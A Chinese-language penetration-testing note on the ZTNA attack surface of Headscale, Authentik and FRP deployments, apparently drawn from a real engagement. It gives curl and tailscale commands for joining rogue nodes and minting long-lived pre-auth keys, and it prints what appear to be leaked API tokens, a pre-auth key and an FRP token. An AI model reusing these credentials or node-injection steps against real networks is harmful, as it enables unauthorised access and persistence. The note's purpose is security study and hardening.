# 零信任网络访问 (ZTNA) 安全 — 架构攻击面

> Level 0: 基础原理 / 网络安全
> 基于实战发现：XW-ZTNA + 2026ZTNA VM，Headscale + Authentik 完全部署泄露

---

## 一、ZTNA 架构概述

### 1.1 什么是 ZTNA

零信任网络访问 (Zero Trust Network Access) 的核心原则：

```
"Never trust, always verify" — 永不信任，始终验证
```

| 传统 VPN | ZTNA |
|:---------|:------|
| 隐式信任（连上VPN就是"内部"） | 每次请求都验证 |
| 网络级访问（IP可达即可访问） | 应用级访问（只开放特定应用） |
| 攻击面大（整个内网暴露给VPN用户） | 攻击面小（只暴露特定应用） |
| 横向移动容易 | 横向移动困难 |

### 1.2 ZTNA 核心组件

```
┌─────────────────────────────────────────────────────────────┐
│                     ZTNA 控制平面                            │
│                                                             │
│  ┌──────────┐  ┌───────────┐  ┌─────────────┐              │
│  │ 身份认证  │  │ 策略引擎  │  │ 会话管理    │              │
│  │ (IdP)    │→│ (PEP/PDP) │→│  (Session    │              │
│  │          │  │           │  │   Manager)  │              │
│  └──────────┘  └───────────┘  └─────────────┘              │
└─────────────────────────────────────────────────────────────┘
         │                     │
         ▼                     ▼
┌─────────────────┐  ┌──────────────────────┐
│  控制通道       │  │  数据平面            │
│  (连接管理)     │  │  (应用流量代理)       │
│                 │  │                      │
│  Headscale      │  │  FRP/ngrok/           │
│  / Tailscale    │  │  Cloudflare Tunnel   │
└─────────────────┘  └──────────────────────┘
```

### 1.3 开源 ZTNA 方案

| 方案 | 控制面 | 数据面 | 身份源 | 部署模式 |
|:-----|:-------|:-------|:-------|:---------|
| **Tailscale** | Tailscale 托管 | WireGuard | 各 IdP | SaaS |
| **Headscale** | 自托管 | WireGuard | OIDC/Authentik | 自建 |
| **Cloudflare Zero Trust** | Cloudflare | Cloudflare Tunnel | Cloudflare Access | SaaS |
| **OpenZiti** | Ziti Controller | Ziti Router | PKI | 自建 |
| **Netmaker** | 自托管 | WireGuard | OIDC | 自建 |

---

## 二、ZTNA 攻击面

### 2.1 信任假设分析

| 假设 | 现实 | 攻击方向 |
|:----|:-----|:---------|
| 所有流量都加密 → 安全 | WireGuard 加密无法阻止端点攻击 | 攻击端点而非网络 |
| 身份验证严格 → 安全 | IdP 配置错误可被绕过 | Authentik/OIDC 配置错误 |
| 应用不暴露 → 安全 | FRP/Tunnel 暴露端口 | FRP 端口扫描发现 |
| 节点可撤销 → 安全 | 预认证 Key 长期有效 | Key 泄露 → 永久访问 |
| 控制平面安全 → 安全 | 控制平面 API 可直接攻击 | Headscale API 泄露 |

### 2.2 攻击面全景

```
ZTNA 攻击面
├── ① 控制平面攻击
│   ├── Headscale API 未授权访问
│   ├── Authentik 配置错误（SSO 绕过）
│   └── API Token 泄露 → 完全控制节点管理
│
├── ② 预认证 Key 泄露
│   ├── Key 长期有效（年/永久）
│   ├── 可注册任意节点到网络
│   └── 获得整个 ZTNA 内网访问
│
├── ③ FRP/隧道出口
│   ├── FRP 端口扫描 → 发现内部服务
│   ├── FRP Token 泄露 → 注册 FRP 客户端
│   └── 隧道出口暴露内网端口
│
├── ④ 节点端攻击
│   ├── ZTNA 节点本身存在漏洞
│   ├── 节点上运行的服务可被攻击
│   └── 节点间隧道可被探测
│
└── ⑤ 身份源绕过
    ├── OIDC 配置错误
    ├── LDAP 注入
    └── 会话固定攻击
```

### 2.3 Headscale 攻击

Headscale 是一个自托管的 Tailscale 控制服务器。其攻击面：

```bash
# Headscale API 端口 (默认 8080/TCP)
curl http://10.50.0.10:8080/
→ 可能返回 API 信息或 404

# Headscale API Token 权限
API Token 可执行的操作:
- 列出所有节点
- 注册新节点
- 删除节点
- 查看路由表
- 修改 ACL 策略

# 预认证 Key 的危害
headscale preauthkeys list --user ztna-users
→ 如果 Key 未过期，可无限注册节点
```

**我们的发现**：
- Headscale API Token: `5fe175edd7a5a4aba5933f617d6076717a039b1368036af354b5ec6d519284dc`
- 预认证 Key (10年有效): `2096f7cc7dace0775f56fc073c2d889d5c2952a5401d87b2`
- 这两个泄露 → 攻击者可以注册任意节点到 ZTNA 网络 → 完全访问 10.20.0.x 和 10.50.0.x

### 2.4 Authentik (IdP) 攻击

Authentik 作为 ZTNA 的身份提供者：

```bash
# Authentik Web (默认 9000/TCP)
http://10.50.0.10:9000/if/flow/initial-setup/
→ 如果未完成初始化 → 可重新配置

# Authentik API
curl -H "Authorization: Bearer <token>" http://10.50.0.10:9000/api/v3/
→ 用户管理、应用配置、策略管理

# Token 完全控制 (我们有 Authentik API Token)
→ 创建/删除用户
→ 配置 SSO 提供商
→ 修改认证策略
→ 生成任意用户的令牌
```

### 2.5 FRP (隧道) 攻击

FRP (Fast Reverse Proxy) 是常见的端口映射工具：

```bash
# FRP 服务端端口 (默认 7000/TCP)
nmap -p 7000 <target>
→ 识别 frps

# FRP Token 泄露
# 在 docker-compose.yml 或 frpc.ini 中
[common]
server_addr = 10.0.1.1
server_port = 7000
token = 292*UoC[MFA-qp9H  ← 可注册自己的 FRP 客户端

# FRP Dashboard (默认 7500/TCP)
→ 可查看所有映射的隧道
→ 了解内部网络暴露面
```

---

## 三、ZTNA 绕过思路

### 3.1 预认证 Key 泄露 → 节点注入

```
获取预认证 Key → 模拟注册节点 → 加入 ZTNA 网络 → 访问所有资源
```

```bash
# 使用 tailscale 注册 (如果 Key 未过期)
tailscale up --login-server http://headscale.example.com \
  --authkey 2096f7cc7dace0775f56fc073c2d889d5c2952a5401d87b2

# 现在这个机器成为了 ZTNA 网络的一部分
# 可以访问 10.20.0.x 和 10.50.0.x 的所有资源
```

### 3.2 API Token 泄露 → 控制平面攻陷

```
获取 API Token → 完全控制 ZTNA
```

```bash
# Headscale API
curl -s -H "Authorization: Bearer 5fe175edd7a5a4...284dc" \
  http://10.50.0.10:8080/api/v1/node
→ 列出所有注册节点

# 创建预认证 Key
curl -s -X POST -H "Authorization: Bearer <token>" \
  http://10.50.0.10:8080/api/v1/preauthkey \
  -d '{"user":"ztna-users","reusable":true,"expiration":"2036-01-01T00:00:00Z"}'
→ 创建永久 Key → 持续控制
```

### 3.3 IdP 配置错误 → 身份绕过

```
Authentik 配置错误 → 创建管理员用户 → SSO 接管
OIDC 配置错误 → authorization code 拦截
LDAP 配置错误 → LDAP 注入
```

### 3.4 物理层攻击

```
ZTNA 虚拟机 (如 10.50.0.10) 关机状态 → 
启动 VM (通过 Proxmox) →
直接挂载磁盘修改配置 →
读取 SQLite 数据库中的用户哈希 →
破解或替换密码 → 登录系统
```

---

## 四、ZTNA 防御建议

| 措施 | 效果 |
|:----|:------|
| 预认证 Key 设置短有效期（最多24小时） | Key 泄露影响有限 |
| API Token 定期轮换 | Token 泄露后有时间窗口 |
| 控制平面不暴露到公网 | 只允许内网访问 |
| Authentik/IdP 启用 MFA | 绕过难度提升 |
| 最小 ACL 策略 | 节点只允许访问必要资源 |
| 节点注册需人工审批 | 阻止自动节点注入 |
| 监控异常节点接入 | 检测攻击行为 |
| 控制平面 API 启用速率限制 | 防止暴力破解 |

---

## 五、关联实战

- **发现来源**：Win10 Everything HTTP → KeePass → XW-ZTNA/2026ZTNA 凭据
- **完整部署泄露**：docker-compose.yml（MySQL/Redis/Authentik/Headscale/FRP 全部凭据）
- **影响**：3个关键 Token 泄露（Authentik + Headscale + FRP）→ ZTNA 网络完全攻陷
- **关联知识**：`crypto/06-password-storage-security.md` → KeePass 密码复用

---

## 参考

- [Headscale Documentation](https://headscale.net/)
- [Authentik Documentation](https://goauthentik.io/docs/)
- [Tailscale Security](https://tailscale.com/security/)
- [NIST SP 800-207 Zero Trust Architecture](https://csrc.nist.gov/publications/detail/sp/800-207/final)
